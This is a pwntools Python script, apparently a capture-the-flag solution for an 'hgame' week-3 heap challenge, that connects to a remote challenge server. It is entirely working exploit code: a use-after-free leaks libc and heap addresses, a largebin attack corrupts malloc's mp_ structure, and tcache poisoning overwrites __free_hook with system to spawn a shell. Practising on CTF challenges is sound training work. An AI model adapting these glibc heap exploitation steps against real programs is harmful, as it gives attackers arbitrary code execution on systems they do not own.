from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(["./vuln"])
sh = remote("week-3.hgame.lwsec.cn", 32004)
elf = ELF("./vuln")
libc = ELF("./2.32-0ubuntu3.2_amd64/libc-2.32.so")
# libc = ELF("/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")


def add(idx: int, size: int):
    sh.sendlineafter(b'5. Exit', b'1')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendlineafter(b'Size: ', str(size).encode())


def delete(idx: int):
    sh.sendlineafter(b'5. Exit', b'2')
    sh.sendlineafter(b'Index: ', str(idx).encode())


def edit(idx: int, content: bytes):
    sh.sendlineafter(b'5. Exit', b'3')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendafter(b'Content: ', content)


def show(idx: int):
    sh.sendlineafter(b'5. Exit', b'4')
    sh.sendlineafter(b'Index: ', str(idx).encode())


# Leak libc addr
add(0, 0x528)  # p1
add(1, 0x500)  # g1
add(2, 0x518)  # p2
add(3, 0x500)  # g2
delete(0)
edit(0, b'A')
show(0)

libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1e3c41
large_addr = libc_base + 0x1e4030
mp_80_addr = libc_base + 0x1e3280 + 0x50
free_hook_addr = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']
print(hex(libc_base))

edit(0, b'\x00')
add(4, 0x538)

# Leak heap addr
edit(0, b'A'*0x10)
show(0)

sh.recvuntil(b'A'*0x10)
heap_addr = u64(sh.recv(6).ljust(8, b'\x00')) - 0x290
print(hex(heap_addr))

# Modify mp_ + 0x80 using largebin attack
edit(0, p64(large_addr)*2 + p64(heap_addr) + p64(mp_80_addr-0x20))
delete(2)
add(5, 0x538)

# Tcache UAF
add(6, 0x600)
add(7, 0x600)
delete(7)
delete(6)
edit(6, p64((heap_addr+0x2190 >> 12) ^ free_hook_addr))

add(8, 0x600)
add(9, 0x600)
edit(8, b'/bin/sh\x00')
edit(9, p64(system_addr))
delete(8)
sh.interactive()